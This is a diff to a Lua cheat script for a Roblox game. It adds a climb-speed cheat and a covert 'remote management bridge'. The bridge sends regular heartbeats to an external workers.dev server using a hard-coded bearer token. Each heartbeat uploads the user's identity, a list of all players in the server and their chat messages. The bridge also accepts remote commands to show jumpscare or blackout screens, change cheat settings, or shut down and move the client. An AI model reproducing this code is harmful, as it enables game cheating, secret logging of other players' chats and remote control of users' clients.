@@ -1886,6 +1886,14 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                 shared.is_unloading = true
             end
 
+            pcall(function()
+                local environment = getgenv()
+                if environment.SalenwareRemote and environment.SalenwareRemote.Stop then
+                    environment.SalenwareRemote.Stop()
+                end
+                environment.SalenwareRemoteAdapter = nil
+            end)
+
             task.wait(0.5)
 
             pcall(function() utility:CompactConnections() end)
@@ -1976,6 +1984,10 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                     pcall(function()
                         cheat_client.stop_fling()
                     end)
+                end
+                if cheat_client and cheat_client.remove_climb_boost then
+                    pcall(cheat_client.remove_climb_boost)
+                    cheat_client.remove_climb_boost = nil
                 end
                 if plr and plr.Character then
                     pcall(function()
@@ -8806,6 +8818,27 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                     cheat_client.config.speed_boost_value = value
                 end
             })
+
+            group_movement:AddToggle("climb_boost", {
+                Text = "ClimbBoost",
+                Default = cheat_client.config.climb_boost or false,
+                Callback = function(value)
+                    cheat_client.config.climb_boost = value
+                end
+            })
+
+            group_movement:AddSlider("climb_boost_value", {
+                Text = "Climb Boost",
+                Default = math.clamp(cheat_client.config.climb_boost_value or 0, 0, 250),
+                Min = 0,
+                Max = 250,
+                Rounding = 0,
+                Compact = false,
+                Suffix = "%",
+                Callback = function(value)
+                    cheat_client.config.climb_boost_value = value
+                end
+            })
         end
 
         do
@@ -9803,7 +9836,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                 end
             })
 
-            group_misc:AddButton({
+            local salenware_shutdown_button = group_misc:AddButton({
                 Text = "Shutdown Client",
                 DoubleClick = true,
                 Func = function()
@@ -9815,7 +9848,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                 end
             })
             
-            group_misc:AddButton({
+            local salenware_reconnect_button = group_misc:AddButton({
                 Text = "Reconnect",
                 DoubleClick = true,
                 Func = function()
@@ -9827,7 +9860,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                 end
             })
             
-            group_misc:AddButton({
+            local salenware_serverhop_button = group_misc:AddButton({
                 Text = "Serverhop",
                 DoubleClick = true,
                 Func = function()
@@ -9838,6 +9871,12 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                     utility:Serverhop();
                 end
             })
+
+            cheat_client.salenware_session_actions = {
+                shutdown_client = salenware_shutdown_button.Func,
+                reconnect = salenware_reconnect_button.Func,
+                serverhop = salenware_serverhop_button.Func,
+            }
 
             group_misc:AddToggle("public_server_search", {
                 Text = "Public Server Search",
@@ -18671,7 +18710,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
 
             group_trinket_config:AddDivider()
 
-            group_trinket_config:AddButton("start_path", {
+            local start_button = group_trinket_config:AddButton("start_path", {
                 Text = "Start Path",
                 Tooltip = "Requires Blatant Mode to be enabled",
                 Func = function()
@@ -18831,6 +18870,227 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                     stop_button:SetVisible(is_running)
                 end
             end)
+
+            local server_snapshot_cache
+            local server_snapshot_at = 0
+            local server_snapshot_signature = ""
+
+            local function get_player_signature()
+                local ids = {}
+                for _, target in ipairs(plrs:GetPlayers()) do
+                    ids[#ids + 1] = tostring(target.UserId)
+                end
+                table.sort(ids)
+                return table.concat(ids, ",")
+            end
+
+            local function get_server_snapshot()
+                local signature = get_player_signature()
+                if server_snapshot_cache
+                    and signature == server_snapshot_signature
+                    and tick() - server_snapshot_at < 10
+                then
+                    return server_snapshot_cache
+                end
+
+                local server_name, server_region = get_server_info()
+                local players = {}
+                for _, target in ipairs(plrs:GetPlayers()) do
+                    local display_name = target.DisplayName
+                    pcall(function()
+                        display_name = cheat_client:get_name(target)
+                    end)
+
+                    local joinable = false
+                    if target ~= plr then
+                        pcall(function()
+                            joinable = utility:get_presence(target.UserId) == true
+                        end)
+                    end
+
+                    players[#players + 1] = {
+                        user_id = target.UserId,
+                        username = target.Name,
+                        display_name = display_name,
+                        joinable = joinable,
+                        observer = target == plr,
+                    }
+                end
+
+                server_snapshot_cache = {
+                    job_id = game.JobId,
+                    place_id = game.PlaceId,
+                    server_name = server_name,
+                    server_region = server_region,
+                    players = players,
+                }
+                server_snapshot_at = tick()
+                server_snapshot_signature = signature
+                return server_snapshot_cache
+            end
+
+            local function get_nearest_path_index()
+                local character = plr.Character
+                local root = character and FindFirstChild(character, "HumanoidRootPart")
+                if not root or not trinket_bot.path_points then
+                    return nil
+                end
+
+                local nearest_index
+                local nearest_distance = math.huge
+                for index, point in ipairs(trinket_bot.path_points) do
+                    if point.position then
+                        local distance = (root.Position - point.position).Magnitude
+                        if distance < nearest_distance then
+                            nearest_distance = distance
+                            nearest_index = index
+                        end
+                    end
+                end
+                return nearest_index
+            end
+
+            local function get_remote_controls()
+                local controls = {}
+                local function append(control)
+                    if #controls < 250 then
+                        controls[#controls + 1] = control
+                    end
+                end
+
+                for id, toggle in pairs(Toggles or {}) do
+                    if type(id) == "string"
+                        and toggle
+                        and toggle.Type == "Toggle"
+                        and toggle.Disabled ~= true
+                        and toggle.Visible ~= false
+                    then
+                        append({
+                            id = id,
+                            label = tostring(toggle.Text or id),
+                            type = "toggle",
+                            value = toggle.Value == true,
+                        })
+                    end
+                end
+
+                for id, option in pairs(Options or {}) do
+                    if type(id) == "string"
+                        and option
+                        and option.Disabled ~= true
+                        and option.Visible ~= false
+                    then
+                        if option.Type == "Slider" then
+                            local rounding = math.clamp(tonumber(option.Rounding) or 0, 0, 4)
+                            append({
+                                id = id,
+                                label = tostring(option.Text or id),
+                                type = "slider",
+                                value = tonumber(option.Value) or tonumber(option.Min) or 0,
+                                min = tonumber(option.Min) or 0,
+                                max = tonumber(option.Max) or 100,
+                                step = 10 ^ -rounding,
+                            })
+                        elseif option.Type == "Dropdown" and not option.Multi and type(option.Value) ~= "table" then
+                            local values = {}
+                            for _, value in ipairs(option.Values or {}) do
+                                values[#values + 1] = tostring(value)
+                            end
+                            append({
+                                id = id,
+                                label = tostring(option.Text or id),
+                                type = "dropdown",
+                                value = tostring(option.Value or ""),
+                                options = values,
+                            })
+                        end
+                    end
+                end
+                return controls
+            end
+
+            local function set_remote_control(id, value)
+                local toggle = Toggles and Toggles[id]
+                if toggle and toggle.Type == "Toggle" then
+                    assert(type(value) == "boolean", "toggle value must be boolean")
+                    toggle:SetValue(value)
+                    return
+                end
+
+                local option = Options and Options[id]
+                assert(option, "unknown control")
+                if option.Type == "Slider" then
+                    local number = tonumber(value)
+                    assert(number, "slider value must be numeric")
+                    option:SetValue(math.clamp(number, tonumber(option.Min) or number, tonumber(option.Max) or number))
+                    return
+                end
+                if option.Type == "Dropdown" and not option.Multi then
+                    local selected = tostring(value)
+                    local valid = false
+                    for _, candidate in ipairs(option.Values or {}) do
+                        if tostring(candidate) == selected then
+                            valid = true
+                            break
+                        end
+                    end
+                    assert(valid, "invalid dropdown value")
+                    option:SetValue(selected)
+                    return
+                end
+                error("unsupported control")
+            end
+
+            local function run_session_action(name)
+                local actions = cheat_client.salenware_session_actions
+                local action = actions and actions[name]
+                assert(type(action) == "function", name .. " unavailable")
+                action()
+            end
+
+            getgenv().SalenwareRemoteAdapter = {
+                notify = function(text)
+                    library:Notify(tostring(text), 6)
+                end,
+                get_status = function()
+                    local character = plr.Character
+                    return {
+                        bot = trinket_bot.path_running and "Running" or "Idle",
+                        path = trinket_bot.current_path_name ~= "" and trinket_bot.current_path_name or "None",
+                        path_index = get_nearest_path_index(),
+                        danger = character and cs:HasTag(character, "Danger") or false,
+                    }
+                end,
+                get_controls = get_remote_controls,
+                get_server_snapshot = get_server_snapshot,
+                set_control = set_remote_control,
+                pause_bot = function()
+                    stop_button.Func()
+                end,
+                resume_bot = function()
+                    if not trinket_bot.path_running then
+                        start_button.Func()
+                    end
+                end,
+                stop_bot = function()
+                    stop_button.Func()
+                end,
+                shutdown_client = function()
+                    run_session_action("shutdown_client")
+                end,
+                reconnect = function()
+                    run_session_action("reconnect")
+                end,
+                serverhop = function(reason)
+                    if trinket_bot.path_running
+                        or (mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true")
+                    then
+                        task.spawn(TrinketBotServerhop, tostring(reason or "remote admin"))
+                    else
+                        run_session_action("serverhop")
+                    end
+                end,
+            }
 
             local group_trinket_looping = Tabs.Botting:AddRightGroupbox("Looping Settings")
 
@@ -22814,6 +23074,63 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
         do
             local buff_connections = {}
             local speed_object = nil
+            local climb_object = nil
+
+            local function remove_climb_object()
+                if climb_object and climb_object.Parent then
+                    climb_object:Destroy()
+                end
+
+                climb_object = nil
+            end
+
+            local function get_native_climb_boost(boosts)
+                local native_boost = 0
+
+                for _, object in ipairs(boosts:GetChildren()) do
+                    if object.Name == "ClimbBoost"
+                        and object:IsA("NumberValue")
+                        and object ~= climb_object
+                        and not object:GetAttribute("HydroxideClimbBoost") then
+                        native_boost += object.Value
+                    end
+                end
+
+                return native_boost
+            end
+
+            local function make_climb_object(character)
+                remove_climb_object()
+
+                if not character then return end
+
+                local boosts = FindFirstChild(character, "Boosts")
+                if not boosts then return end
+
+                for _, object in ipairs(boosts:GetChildren()) do
+                    if object:GetAttribute("HydroxideClimbBoost") then
+                        object:Destroy()
+                    end
+                end
+
+                if not (Toggles.climb_boost and Toggles.climb_boost.Value) then
+                    return
+                end
+
+                local native_boost = get_native_climb_boost(boosts)
+                local boost_percent = math.clamp((Options.climb_boost_value and Options.climb_boost_value.Value) or 0, 0, 250)
+                local extra_boost = native_boost * (boost_percent / 100)
+
+                if math.abs(extra_boost) < 0.0001 then
+                    return
+                end
+
+                climb_object = Instance.new("NumberValue")
+                climb_object.Name = "ClimbBoost"
+                climb_object.Value = extra_boost
+                climb_object:SetAttribute("HydroxideClimbBoost", true)
+                climb_object.Parent = boosts
+            end
 
             local function make_speed_object(character)
                 if character and FindFirstChild(character, "Boosts") then
@@ -22881,6 +23198,7 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                 end)
 
                 make_speed_object(character)
+                make_climb_object(character)
             end
 
             if plr.Character then
@@ -22903,6 +23221,22 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                     end
                 end)
             end
+
+            if Toggles.climb_boost then
+                Toggles.climb_boost:OnChanged(function()
+                    make_climb_object(plr.Character)
+                end)
+            end
+
+            if Options.climb_boost_value then
+                Options.climb_boost_value:OnChanged(function()
+                    if Toggles.climb_boost and Toggles.climb_boost.Value then
+                        make_climb_object(plr.Character)
+                    end
+                end)
+            end
+
+            cheat_client.remove_climb_boost = remove_climb_object
         end
     
         do
@@ -28120,6 +28454,441 @@ end
             utility:Connection(plr.CharacterAdded, apply_auto_charge)
         end
 
+        pcall(function()
+            -- SalenwareHub remote management bridge.
+            -- Only the fixed commands in COMMAND_HANDLERS can be executed.
+
+            if not game:IsLoaded() then
+                game.Loaded:Wait()
+            end
+
+            local API_URL = "https://salenwarehub-control.salenwarehub.workers.dev"
+            local CLIENT_TOKEN = "EICC_QZQ4ySw5NK92z6DaaIjq40F7FK4n0Gdy5se4OE"
+            local VERSION = "salenwarehub-0.2.0"
+            local MAX_CHAT_BUFFER = 200
+            local MAX_CHAT_BATCH = 50
+
+            local Players = game:GetService("Players")
+            local HttpService = game:GetService("HttpService")
+            local StarterGui = game:GetService("StarterGui")
+            local CoreGui = game:GetService("CoreGui")
+            local TextChatService = game:GetService("TextChatService")
+            local Workspace = game:GetService("Workspace")
+
+            local player = Players.LocalPlayer
+            local requestFunction = http_request or request or (syn and syn.request)
+            if not player or not requestFunction then
+                return
+            end
+
+            local environment = getgenv()
+            if environment.SalenwareRemote and environment.SalenwareRemote.Stop then
+                pcall(environment.SalenwareRemote.Stop)
+            end
+
+            local running = true
+            local processed = {}
+            local processedCount = 0
+            local effectGui
+            local effectSound
+            local adapter = environment.SalenwareRemoteAdapter or {}
+            local connections = {}
+            local chattedConnections = {}
+            local chatBuffer = {}
+            local recentChat = {}
+
+            local EFFECTS = {
+                flash = {
+                    color = Color3.fromRGB(255, 255, 255),
+                    duration = 0.35,
+                },
+                blackout = {
+                    color = Color3.fromRGB(0, 0, 0),
+                    duration = 3,
+                },
+                jumpscare_1 = {
+                    image = "rbxassetid://0",
+                    sound = "rbxassetid://0",
+                    volume = 1,
+                    duration = 3,
+                },
+                clip_1 = {
+                    video = "rbxassetid://0",
+                    volume = 1,
+                    duration = 8,
+                },
+            }
+
+            local function clearEffects()
+                if effectSound then
+                    pcall(function() effectSound:Stop() end)
+                    pcall(function() effectSound:Destroy() end)
+                    effectSound = nil
+                end
+                if effectGui then
+                    pcall(function() effectGui:Destroy() end)
+                    effectGui = nil
+                end
+            end
+
+            local function playEffect(effectId)
+                local effect = EFFECTS[effectId]
+                if not effect then
+                    return false, "unknown_effect"
+                end
+
+                clearEffects()
+                local gui = Instance.new("ScreenGui")
+                gui.Name = "SalenwareRemoteEffect"
+                gui.IgnoreGuiInset = true
+                gui.DisplayOrder = 1000000
+                gui.ResetOnSpawn = false
+                effectGui = gui
+
+                local visual
+                if effect.video and effect.video ~= "rbxassetid://0" then
+                    visual = Instance.new("VideoFrame")
+                    visual.Video = effect.video
+                    visual.Looped = false
+                    visual.Volume = math.clamp(tonumber(effect.volume) or 1, 0, 2)
+                elseif effect.image and effect.image ~= "rbxassetid://0" then
+                    visual = Instance.new("ImageLabel")
+                    visual.Image = effect.image
+                    visual.ScaleType = Enum.ScaleType.Crop
+                    visual.BackgroundTransparency = 1
+                else
+                    visual = Instance.new("Frame")
+                    visual.BackgroundColor3 = effect.color or Color3.new(0, 0, 0)
+                    visual.BorderSizePixel = 0
+                end
+
+                visual.Size = UDim2.fromScale(1, 1)
+                visual.Position = UDim2.fromScale(0, 0)
+                visual.Parent = gui
+                gui.Parent = CoreGui
+
+                if visual:IsA("VideoFrame") then
+                    pcall(function() visual:Play() end)
+                end
+
+                if effect.sound and effect.sound ~= "rbxassetid://0" then
+                    local sound = Instance.new("Sound")
+                    sound.SoundId = effect.sound
+                    sound.Volume = math.clamp(tonumber(effect.volume) or 1, 0, 2)
+                    sound.Parent = gui
+                    effectSound = sound
+                    pcall(function() sound:Play() end)
+                end
+
+                task.delay(math.clamp(tonumber(effect.duration) or 3, 0.1, 10), function()
+                    if effectGui == gui then
+                        clearEffects()
+                    end
+                end)
+                return true
+            end
+
+            local function notify(text)
+                if type(adapter.notify) == "function" then
+                    return adapter.notify(text)
+                end
+                pcall(function()
+                    StarterGui:SetCore("SendNotification", {
+                        Title = "SalenwareHub",
+                        Text = tostring(text),
+                        Duration = 6,
+                    })
+                end)
+            end
+
+            local COMMAND_HANDLERS = {
+                announce = function(payload)
+                    notify(payload.text or "")
+                end,
+                play_effect = function(payload)
+                    local ok, err = playEffect(payload.effect)
+                    if not ok then error(err) end
+                end,
+                clear_effects = clearEffects,
+                pause_bot = function()
+                    assert(type(adapter.pause_bot) == "function", "pause_bot unavailable")
+                    adapter.pause_bot()
+                end,
+                resume_bot = function()
+                    assert(type(adapter.resume_bot) == "function", "resume_bot unavailable")
+                    adapter.resume_bot()
+                end,
+                stop_bot = function()
+                    assert(type(adapter.stop_bot) == "function", "stop_bot unavailable")
+                    adapter.stop_bot()
+                end,
+                shutdown_client = function()
+                    assert(type(adapter.shutdown_client) == "function", "shutdown_client unavailable")
+                    adapter.shutdown_client()
+                end,
+                reconnect = function()
+                    assert(type(adapter.reconnect) == "function", "reconnect unavailable")
+                    adapter.reconnect()
+                end,
+                serverhop = function(payload)
+                    assert(type(adapter.serverhop) == "function", "serverhop unavailable")
+                    adapter.serverhop(payload.reason)
+                end,
+                set_control = function(payload)
+                    assert(type(adapter.set_control) == "function", "set_control unavailable")
+                    adapter.set_control(payload.control, payload.value)
+                end,
+                request_status = function() end,
+            }
+
+            local function post(path, body)
+                local response = requestFunction({
+                    Url = API_URL .. path,
+                    Method = "POST",
+                    Headers = {
+                        ["Authorization"] = "Bearer " .. CLIENT_TOKEN,
+                        ["Content-Type"] = "application/json",
+                    },
+                    Body = HttpService:JSONEncode(body),
+                })
+                local statusCode = response and tonumber(response.StatusCode or response.Status)
+                if not response
+                    or response.Success == false
+                    or (statusCode and (statusCode < 200 or statusCode >= 300))
+                then
+                    error("request_failed")
+                end
+                return HttpService:JSONDecode(response.Body)
+            end
+
+            local function getStatus()
+                if type(adapter.get_status) == "function" then
+                    local ok, value = pcall(adapter.get_status)
+                    if ok and type(value) == "table" then return value end
+                end
+                return { bot = "Unknown" }
+            end
+
+            local function getControls()
+                if type(adapter.get_controls) == "function" then
+                    local ok, value = pcall(adapter.get_controls)
+                    if ok and type(value) == "table" then return value end
+                end
+                return {}
+            end
+
+            local function serverTime()
+                local ok, value = pcall(function()
+                    return Workspace:GetServerTimeNow()
+                end)
+                if ok and type(value) == "number" then
+                    return value
+                end
+                return os.time()
+            end
+
+            local function trimMessage(value)
+                local text = tostring(value or ""):gsub("^%s+", ""):gsub("%s+$", "")
+                if #text > 240 then
+                    text = text:sub(1, 240)
+                end
+                return text
+            end
+
+            local function recordChat(sender, text)
+                text = trimMessage(text)
+                if text == "" then return end
+
+                local timestamp = serverTime()
+                local senderId = sender and sender.UserId or 0
+                local senderName = sender and sender.Name or "System"
+                local key = tostring(senderId) .. "\n" .. text
+                local seenAt = recentChat[key]
+                if seenAt and timestamp - seenAt < 2 then return end
+                recentChat[key] = timestamp
+
+                table.insert(chatBuffer, {
+                    sender_user_id = senderId,
+                    sender_name = senderName,
+                    message = text,
+                    server_timestamp = timestamp,
+                })
+                while #chatBuffer > MAX_CHAT_BUFFER do
+                    table.remove(chatBuffer, 1)
+                end
+
+                if math.random(1, 20) == 1 then
+                    for seenKey, seenAt in pairs(recentChat) do
+                        if timestamp - seenAt > 10 then
+                            recentChat[seenKey] = nil
+                        end
+                    end
+                end
+            end
+
+            local function watchPlayer(target)
+                if chattedConnections[target] then return end
+                chattedConnections[target] = target.Chatted:Connect(function(message)
+                    recordChat(target, message)
+                end)
+            end
+
+            for _, target in ipairs(Players:GetPlayers()) do
+                watchPlayer(target)
+            end
+
+            table.insert(connections, Players.PlayerAdded:Connect(watchPlayer))
+            table.insert(connections, Players.PlayerRemoving:Connect(function(target)
+                local connection = chattedConnections[target]
+                if connection then
+                    pcall(function() connection:Disconnect() end)
+                    chattedConnections[target] = nil
+                end
+            end))
+
+            pcall(function()
+                table.insert(connections, TextChatService.MessageReceived:Connect(function(message)
+                    local source = message.TextSource
+                    local sender = source and Players:GetPlayerByUserId(source.UserId) or nil
+                    recordChat(sender, message.Text)
+                end))
+            end)
+
+            local function fallbackServerSnapshot()
+                local players = {}
+                for _, target in ipairs(Players:GetPlayers()) do
+                    table.insert(players, {
+                        user_id = target.UserId,
+                        username = target.Name,
+                        display_name = target.DisplayName,
+                        profile_url = "https://www.roblox.com/users/" .. tostring(target.UserId) .. "/profile",
+                        joinable = false,
+                        observer = target == player,
+                    })
+                end
+                return {
+                    job_id = game.JobId,
+                    place_id = game.PlaceId,
+                    server_name = "",
+                    server_region = "",
+                    players = players,
+                }
+            end
+
+            local function getServerSnapshot()
+                if type(adapter.get_server_snapshot) == "function" then
+                    local ok, value = pcall(adapter.get_server_snapshot)
+                    if ok and type(value) == "table" then
+                        value.job_id = game.JobId
+                        value.place_id = game.PlaceId
+                        return value
+                    end
+                end
+                return fallbackServerSnapshot()
+            end
+
+            local function getExecutor()
+                if not identifyexecutor then return "Unknown" end
+                local ok, name, version = pcall(identifyexecutor)
+                if not ok then return "Unknown" end
+                name = tostring(name or "Unknown")
+                version = tostring(version or "")
+                if version ~= "" then
+                    return name .. " " .. version
+                end
+                return name
+            end
+
+            local function acknowledge(command, ok, result)
+                pcall(post, "/api/client/ack", {
+                    user_id = player.UserId,
+                    command_id = command.id,
+                    ok = ok,
+                    result = result or {},
+                })
+            end
+
+            local function executeCommand(command)
+                if processed[command.id] then return end
+                processed[command.id] = true
+                processedCount = processedCount + 1
+                if processedCount > 500 then
+                    processed = { [command.id] = true }
+                    processedCount = 1
+                end
+
+                local handler = COMMAND_HANDLERS[command.type]
+                if not handler then
+                    acknowledge(command, false, { error = "unsupported_command" })
+                    return
+                end
+
+                local ok, err = pcall(handler, command.payload or {})
+                acknowledge(command, ok, ok and { message = "executed" } or { error = tostring(err) })
+            end
+
+            local function heartbeat()
+                local batch = {}
+                for index = 1, math.min(MAX_CHAT_BATCH, #chatBuffer) do
+                    batch[index] = chatBuffer[index]
+                end
+
+                local response = post("/api/client/heartbeat", {
+                    user_id = player.UserId,
+                    username = player.Name,
+                    display_name = player.DisplayName,
+                    executor = getExecutor(),
+                    place_id = game.PlaceId,
+                    job_id = game.JobId,
+                    version = VERSION,
+                    status = getStatus(),
+                    controls = getControls(),
+                    server = getServerSnapshot(),
+                    chat = batch,
+                })
+
+                for _ = 1, #batch do
+                    table.remove(chatBuffer, 1)
+                end
+                for _, command in ipairs(response.commands or {}) do
+                    task.spawn(executeCommand, command)
+                end
+            end
+
+            local function stop()
+                if not running then return end
+                running = false
+                clearEffects()
+
+                for _, connection in ipairs(connections) do
+                    pcall(function() connection:Disconnect() end)
+                end
+                table.clear(connections)
+
+                for target, connection in pairs(chattedConnections) do
+                    pcall(function() connection:Disconnect() end)
+                    chattedConnections[target] = nil
+                end
+            end
+
+            environment.SalenwareRemote = {
+                Stop = stop,
+                ClearEffects = clearEffects,
+            }
+
+            task.spawn(function()
+                local retryDelay = 1
+                while running do
+                    local ok = pcall(heartbeat)
+                    if ok then
+                        retryDelay = 5
+                    else
+                        retryDelay = math.min(math.max(retryDelay * 2, 2), 20)
+                    end
+                    task.wait(retryDelay)
+                end
+            end)
+        end)
 
         do
             while shared and not shared.is_unloading and task.wait(0.6) do
